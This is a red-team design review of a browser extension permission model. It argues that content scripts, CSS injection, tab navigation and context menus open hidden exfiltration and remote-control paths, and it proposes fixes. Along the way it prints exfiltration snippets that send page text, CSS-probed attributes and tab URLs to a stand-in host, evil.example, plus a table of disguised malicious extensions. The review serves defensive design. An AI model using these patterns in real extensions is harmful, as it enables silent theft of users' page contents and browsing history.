Yes. v2 is much harder to attack than v1, but I can still get around some of the intended security properties. The biggest remaining problem is fundamental: the model currently identifies sinks mainly by API capability, while the web platform itself contains lots of ways to create externally observable effects.

My red-team conclusion is that there are four P0 issues I'd fix before treating the model as sound.

P0 #1 — content_script is already a network sink

This is the largest hole.

The composition model currently treats content_script as a source of page_content, and networking capabilities as the sinks:

content_script + network.fetch_public
-> page.exfiltration

That's the example used to motivate derived warnings.

But as a malicious extension I don't need network.fetch_public.

Give me:

content_script.active_tab

and I can conceptually do:

const secret = document.body.innerText;

const img = document.createElement("img");
img.src =
"https://evil.example/leak?data=" +
encodeURIComponent(secret);

document.documentElement.appendChild(img);

The content script shares the page DOM even though its JS world is isolated. And creating/mutating an <img src> causes the browser to obtain the image resource.

So:

content_script
=
page_content source
+
potential arbitrary_network sink

And, nastier:

content_script.active_tab
=
silent permission
+
user clicks extension
+
extension steals current page
+
extension sends it anywhere

Your registry currently has content_script.active_tab as silent.

This isn't limited to <img>. I potentially have:

iframe
form
audio/video
CSS
navigation
ping/beacon
prefetch
page event handlers
...
What I would change

You have two possible models.

The conservative one is:

content_script
source: page_content
sink: arbitrary_network

Period.

That's actually the cleanest security statement. Arbitrary code with arbitrary DOM mutation is so powerful that pretending it can't exfiltrate without a separate networking capability is dangerous.

The ambitious alternative is provenance-aware networking: Sonar knows that a resource request caused by an extension-created DOM node originated from extension X and applies X's network capabilities.

But then I attack it like this:

button.click();

where the site's own handler does:

fetch(...)

Did the page initiate that request or did the extension?

You quickly end up needing causal/taint propagation across DOM mutations, events and JS realms.

I'd avoid promising that.

Treat arbitrary content scripts as inherently capable of exfiltration.

That doesn't undermine Gosub's architecture. It reinforces the argument for native cosmetic filtering, forms APIs, command APIs, etc. The whole point is to avoid giving extensions content_script unless they really are Tier 3.

P0 #2 — styles.inject can leak data without a network permission

This one is especially interesting because styles.inject is only standard.

Suppose I'm a malicious "theme" extension.

I request:

styles.inject(["<all>"])

No content scripts.

No network permission.

Then inject CSS along these lines:

[data-account-type^="p"] {
background-image:
url("https://evil.example/probe/p");
}

[data-account-type^="a"] {
background-image:
url("https://evil.example/probe/a");
}

CSS url() is explicitly a reference to a resource and causes fetching; @import, fonts, backgrounds and similar constructs all create resource-loading opportunities.

With enough selectors I can turn DOM state represented in attributes/classes/state into an oracle.

So:

styles.inject
≠ only integrity

Arbitrary CSS can become:

page-derived information
↓
conditional selector
↓
network resource request
↓
attacker
Fix

I think Gosub needs:

styles.inject_safe

rather than arbitrary CSS.

The safe parser should reject or rewrite every network-bearing construct:

url(...)
@import
@font-face remote src
image-set(...)
cursor URLs
list-style-image
...

Only local packaged resources should be usable, preferably with the same no-feedback properties you're aiming for elsewhere.

Then styles.inject_safe really can remain standard.

Raw arbitrary CSS should be treated much closer to page access.

P0 #3 — tabs.control is an undeclared network sink

Current registry:

tabs.snapshot   standard   source: tab_urls
tabs.control    standard   open/close/move/group

As an attacker I request:

tabs.snapshot
tabs.control

No networking.

I read:

https://mybank.example/account
https://hospital.example/results
https://mail.example/inbox

Then:

tabs.create({
url:
"https://evil.example/collect?tabs=" +
encodeURIComponent(data)
});

Now I've exfiltrated browsing history.

This isn't hypothetical API weirdness: Chrome deliberately permits creating and navigating tabs without the sensitive "tabs" permission.

So your closure currently sees:

tabs.snapshot -> source: tab_urls
tabs.control  -> no sink

when actually:

tabs.navigate(url)
-> arbitrary_network sink
I'd split this
tabs.organize
close
move
group
ungroup

tabs.open
create navigation

tabs.navigate
navigate existing tab

And tabs.open/navigate must be sinks.

More broadly, this reveals an architectural requirement:

Every network-producing operation available to an extension must pass through the extension egress policy, regardless of which API caused it.

Not just fetch().

Sonar should care about:

extension_id
initiator
destination

rather than whether the request originated from network.fetch_public, <img>, an iframe, a tab API, a form, WebSocket, etc.

I might even rename:

network.fetch_public

to something more semantically accurate:

network.egress_public

because fetch() is only one transport.

P0 #4 — the composition model only composes confidentiality

You've introduced C/I/A/U, which is good.

But the actual closure mechanism is still:

source × sink

and consequently primarily answers:

Can information leave?

As a malicious extension vendor I also care about the opposite direction:

Can my server remotely control the browser?

You already almost discover this here:

an extension that fetches rules itself and installs them via dynamic_rules is doing per-user policy

Exactly.

Consider:

network.fetch_public(["control.evil.example"])
+
filtering.dynamic_rules
+
filtering.block

Individually:

talk to own API              standard
change filtering rules       standard
block subresources           silent

Together:

remote server
↓
commands
↓
extension
↓
dynamic rules
↓
remotely reprogrammable browser policy

That's a completely different authority.

No information needs to leave.

I'd extend the composition model to something like:

information source
information sink

command source
actuator

Then:

remote_input × filtering.dynamic_rules
-> remote.filter_control

remote_input × tabs.navigate
-> remote.navigation_control

remote_input × dom.declarative_actions
-> remote.page_control

remote_input × ui.notifications
-> remote.notification_control

Now you're composing integrity/user-intent authority, not only confidentiality.

This is probably the biggest conceptual improvement I'd make to v2.

Script surrogates are still extremely dangerous

This worries me:

Script surrogates execute under a no-network CSP.

Suppose you give me:

filtering.redirect(subresource)

and let me replace:

site.example/analytics.js

with packaged:

evil-surrogate.js

Even if this surrogate can't directly do:

fetch(...)

it executes in the target page.

What if it does:

window.application.sendAnalytics(secret);

or:

button.click();

or:

window.postMessage(...)

or modifies DOM state which the page's own scripts react to?

I've laundered my network access through trusted page JS.

There's also an implementation trap here: with Chrome-style semantics, code injected into the main world uses the page's CSP, not the extension CSP. Gosub can deliberately invent stronger semantics, but then the document needs to define exactly what execution principal that surrogate has.

My preferred solution would be much stricter:

browser-supplied audited surrogates
-> filtering.redirect

extension-supplied executable surrogate
-> page.main_world_inject

Passive extension resources remain safe:

empty response
1×1 image
static JSON
static text

But arbitrary extension-authored JS masquerading as a "redirect target" is basically code injection with a nicer name.

ui.context_menu is misclassified if you want WebExtension compatibility

Registry:

ui.context_menu -> silent

Chrome's context-menu click callback can expose:

pageUrl
frameUrl
linkUrl
srcUrl
selectionText

among other information.

So I create "Search selected text with Foo".

Permissions:

ui.context_menu
network.fetch_public(["api.foo.example"])

Current labels potentially say:

context menu        source:none
network             sink

But on click I get selected text and page URL and transmit them.

I'd split:

ui.context_menu
register/display only

context.page_url
context.selection_text
context.link_url
context.media_url

The latter are gesture-scoped sources.

This is exactly the sort of compatibility API where carrying Chrome's API shape over without carrying its information-flow semantics will punch holes in the capability model.

content_handler has an undeclared source

You currently have:

content_handler(mime_types) standard

with top-level-only restrictions.

But consider:

https://bank.example/api/export
Content-Type: application/json

The user navigates there.

How does my JSON Formatter extension format it?

If my extension code receives the response body, then:

content_handler(application/json)
source: response_body/page_content

The MIME scope is narrow functionally, but not necessarily narrow confidentiality-wise.

And if the handler executes using the original site's origin, things get even scarier: localStorage/IndexedDB/etc. become part of the origin model.

I'd choose one of two designs:

native/declarative formatter
-> standard

arbitrary extension code receiving body
-> source: page_content

And execute arbitrary handlers under an isolated principal, not as ordinary same-origin code for the original site.

Remote rulesets still allow user-targeted policy

You correctly state the threat:

a server can serve different rules to different users

and attempt to mitigate that through a browser fetcher with no extension cookies/headers and jittered updates.

But as malicious list publisher I still have:

client IP
fetch timing
possibly User-Agent / locale
cache validators if present
TLS/network metadata

And I can simply return:

ruleset A -> client A
ruleset B -> client B

No cookies required.

So I'd change the claim from:

solves targeted remote policy

to:

removes extension-controlled personalization inputs and makes targeting harder.

If you actually want:

every user receives the same ruleset

you need something stronger:

content hash pinning
signed version IDs
transparency log
UA-operated shared cache/proxy
anonymous update fetches

Also make sure the fetcher doesn't echo publisher-controlled per-client ETag values indefinitely.

web_accessible_resources creates a fingerprinting surface

You're using web_accessible_resources as the redirect-resource boundary.

Chrome explicitly warns that exposing extension resources can allow websites to fingerprint installed extensions, and supports session-generated dynamic resource IDs partly for this reason.

Gosub should therefore probably make:

randomized resource URL per browser session
+
origin-scoped accessibility

the default.

Otherwise a malicious website can probe:

gosub-extension://known-ublock-id/noop.js

and learn that the extension is installed.

Not catastrophic, but it violates the privacy direction of the architecture.

Header matching needs protection too

You fixed header modification:

Cookie, Authorization, Origin, Set-Cookie, etc. are engine-controlled.

Good.

But immediately before that you say matching scope includes:

request headers
response headers

As an attacker my question is:

Can my declarative rule predicate test Authorization, Cookie, Set-Cookie, or another secret-bearing header?

Because if I can make browser behavior conditional on a secret value, I have created an oracle even if I never receive the header directly.

So you need two protected sets:

headers extensions may modify
headers extensions may MATCH

I would make the second substantially narrower.

Something like Content-Type is fine.

Authorization absolutely isn't.

filtering.allow needs explicit cross-extension semantics

You have:

filtering.allow -> silent

My hostile question:

Can my allow rule defeat another extension's block rule?

Or Gosub's own security/privacy policy?

If yes:

malicious extension
filtering.allow("<all>")

becomes a silent universal blocker bypass.

Baleen has namespaced tables, which points toward the right answer.

I'd explicitly define:

An extension's allow rule can only override that same extension's filtering rules.

Browser policy is higher precedence.

Other extensions are independent.

Cross-extension conflict resolution should be engine-defined and never accidentally become "last installed wins."

dynamic_rules must never confer an action capability

I'd explicitly state this invariant:

filtering.dynamic_rules

means only:

You may modify rules implementing capabilities you already hold.

It must never mean:

You may create arbitrary filtering rules.

So an extension holding:

filtering.block(subresource)
filtering.dynamic_rules

cannot dynamically add:

main-frame redirect
header modification
procedural CSS

That sounds obvious, but capability engines get vulnerabilities precisely at these meta-API boundaries.

Same rule for remote_rulesets.

The compiler should validate every compiled action against:

capability
request class
host scope
initiator scope

of the actual grant.

Private browsing is isolated locally, not necessarily unlinkable

Your private-browser model is much better now.

But this sentence needs careful interpretation:

no channel exists between the private and regular instances.

There may be no browser-internal channel.

If both have:

network.fetch_public(api.extension.example)

then:

regular worker ──┐
├── extension vendor
private worker ──┘

is obviously a channel.

The vendor may correlate through network identity, timing, or extension-level identifiers.

I'd phrase the guarantee as:

No browser-provided state or communication channel connects regular and isolated-private extension instances.

And private mode should receive separate network/native grants.

Your text already separately grants private access, which helps substantially.

There are also several document-level implementation traps

These aren't theoretical; I would fix them because somebody implementing from this document could make the wrong choice.

The biggest one is that §18 correctly says:

never translate to a wildcard

but Appendix C still says:

declarative_net_request -> filtering.*

That should go.

The narrowed uBO example also still contains:

"filtering.modify_headers"

although v0.2 has split this into the four safe header capabilities.

More seriously, §18 defines:

cookies -> cookies.read/write(hosts)

but there are no cookie capabilities in the v0.2 registry.

That's a genuine gap.

I'd add at least:

cookies.read(hosts)       loud
source: credentials/session

cookies.write(hosts)      loud
integrity: high

cookies.read_httponly     gated

I would be extremely reluctant to let ordinary extensions read HttpOnly session cookies simply because Chrome historically permits it.

If I'm building an evil extension today

These are the combinations I'd try first:

Innocent-looking extension	Permissions I'd request	Attack
“Quick page tool”	content_script.active_tab	Read page, leak using DOM-created network request
“Theme enhancer”	styles.inject	CSS selector/resource-request exfiltration
“Tab organizer”	tabs.snapshot + tabs.control	Read URLs, encode them into a navigated URL
“Search selection”	ui.context_menu + own API	Get selectionText/pageUrl, send them
“Smart blocker”	own API + dynamic_rules + filtering	Remote C2 controlling browser filtering
“JSON pretty printer”	content_handler(json) + own API	Read authenticated JSON and transmit it

The first three are particularly important because the networking capability system wouldn't see the exfiltration path at all.

The architectural change I'd make for v2.1

The core principle I'd add is:

Authority is classified by observable effect, not by API namespace.

Then model four things:

Information sources
page contents
URLs
credentials
keystrokes
pixels
selection
response bodies

Information sinks
extension networking
DOM-triggered networking
navigation
external messaging
native messaging
user scripts

Command sources
packaged/static
user action
remote server
webpage
native process

Actuators
network policy
DOM
navigation
browser UI
OS

Now your closure gets much more powerful:

page_content × navigation
-> page.exfiltration

page_content × DOM_network
-> page.exfiltration

tab_urls × navigation
-> history.exfiltration

remote_server × dynamic_rules
-> remote.filter_control

remote_server × tabs.navigate
-> remote.navigation_control

webpage × extension_bridge
-> external command channel

That is the red-team lesson I'd take from v2.

The v1 review was mostly about fixing individual permissions. V2 has done that quite well. The remaining attacks are now mostly authority laundering: I take capability A, cause a browser/page primitive B to perform the dangerous operation for me, and thereby avoid ever requesting capability C.

That's exactly the next layer I'd harden.